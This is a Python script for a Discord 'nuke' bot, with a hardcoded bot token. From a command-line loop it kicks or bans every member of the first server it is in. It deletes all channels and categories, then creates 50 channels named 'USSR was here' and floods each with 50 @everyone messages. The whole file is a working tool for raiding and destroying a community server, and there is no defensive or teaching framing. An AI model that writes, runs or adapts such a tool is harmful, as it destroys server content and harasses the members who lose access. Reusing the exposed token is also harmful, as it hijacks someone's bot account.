import asyncio
import threading

import discord
from discord.ext import commands

prefix = "!"
TOKEN = 'MTAyMjkyMjE5Mzc2MTQ4NDg5MQ.GdHJMR.FsDpQwh8tYWmUKq1-ympqBawnV0TYtzG61ZJm8'

intents = discord.Intents.default()  # create instance of Intents class
bot = commands.Bot(command_prefix=prefix, intents=intents)  # pass intents to Bot constructor

# rest of your code

with open("battlestandard.png", 'rb') as f:
    image = discord.File(f)
message = f"@everyone USSR is here. Stand down."

def run_bot():
    bot.run(TOKEN)

async def kick_all_members(guild):
    for member in guild.members:
        await member.kick()
        print(f'{member} kicked.')
    print('All members have been kicked.')

async def ban_all_members(guild):
    for member in guild.members:
        await member.ban()
        print(f'{member} banned.')
    print('All members have been banned.')

async def create_text_channels_with_messages(guild):
    await delete_all_channels_and_categories(guild)
    tasks = []
    for i in range(50):
        tasks.append(create_channel_and_send_messages(guild, i))
        await asyncio.sleep(1)  # Add delay here
    await asyncio.gather(*tasks)

async def create_channel_and_send_messages(guild, i):
    existing_channel = discord.utils.get(guild.channels, name=f"USSR was here {i}")
    if not existing_channel:
        new_channel = await guild.create_text_channel(f"USSR was here {i}")
        message_tasks = [new_channel.send(message) for _ in range(50)]
        await asyncio.sleep(0.5)  # Add delay here
        await asyncio.gather(*message_tasks)
        print(f'New text channel "USSR was here {i}" created and message sent.')
    else:
        print('Channel with that name already exists.')


async def send_message_to_channel(guild, channel_id, message, include_everyone=False, image_path=None):
    channel = bot.get_channel(int(channel_id))
    if channel:
        if image_path:
            with open(image_path, 'rb') as f:
                image = discord.File(f)
            await channel.send(content=message, file=image)
        else:
            if include_everyone:
                await channel.send(f"@everyone {message}")
            else:
                await channel.send(message)
        print(f'Message sent to channel {channel_id}.')
    else:
        print('Invalid channel ID.')

async def delete_all_channels_and_categories(guild):
    tasks = [delete_channel(channel) for channel in guild.channels if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel))]
    await asyncio.gather(*tasks)
    print('All channels and categories have been deleted.')

async def delete_channel(channel):
    await channel.delete()
    print(f'{channel} deleted.')

# Command-line interface
if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()
    print("Bot is running. You can now use command line inputs.")

    while True:
        try:
            command = input("Enter command: ")
            if command.lower() == "quit":
                break
            elif command.lower() == "!kick":
                asyncio.run_coroutine_threadsafe(kick_all_members(bot.guilds[0]), bot.loop)
            elif command.lower() == "!ban":
                asyncio.run_coroutine_threadsafe(ban_all_members(bot.guilds[0]), bot.loop)
            elif command.startswith("!nuke"):
                asyncio.run_coroutine_threadsafe(create_text_channels_with_messages(bot.guilds[0]), bot.loop)
            elif command.startswith("!send_message"):
                _, channel_id, message = command.split(" ", 2)
                asyncio.run_coroutine_threadsafe(send_message_to_channel(bot.guilds[0], channel_id, message), bot.loop)
            else:
                print("Invalid command. Please try again.")
        except Exception as e:
            print(f"An error occurred: {e}")
